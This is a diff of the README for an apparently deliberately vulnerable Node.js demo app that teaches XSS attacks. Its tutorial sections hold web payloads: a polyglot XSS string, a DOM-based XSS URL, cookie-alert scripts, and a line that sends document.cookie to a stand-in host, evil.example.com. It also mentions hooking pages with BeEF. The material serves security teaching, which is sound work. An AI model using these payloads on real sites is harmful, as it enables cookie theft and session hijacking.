@@ -2,7 +2,13 @@
 
 This application is a demonstration prototype just to show how to perform XSS attacks.
 
-# Setting-up
+## Setting-up
+
+### Deploy on heroku
+
+[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+
+### Deploy on your host
 
 * Install nodejs
 
@@ -20,11 +26,12 @@ $ node app.js
 
 * Make sure that TCP/3000 is allowed on your firewall
 
-# Tutorials
+
+## Tutorials
 
 These tutorials will walk you through using XSS attacks.
 
-## Reflected XSS
+### Reflected XSS
 
 * Open http://localhost:3000
 
@@ -52,14 +59,14 @@ These tutorials will walk you through using XSS attacks.
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert('XSS')//>
 ```
 
-## DOM-Based XSS
+### DOM-Based XSS
 
 * Open http://localhost:3000/#message (A script inserts this URL fragment in the page)
 
 * Open http://localhost:3000/#%3Cscript%3Ealert(%22XSS%22);%3C/script%3E
 
 
-## Steal cookie
+### Steal cookie
 
 ```javascript
 <script>alert(document.cookie);</script>
@@ -77,7 +84,7 @@ Redirection will be suspicious! Try without redirecting on another page.
 <script>document.write('<img src="http://evil.example.com/img.jpg?cookie=' + document.cookie + '" />')</script>
 ```
 
-## Beef
+### Beef
 
 Payload to hook the page with BeEF:
 
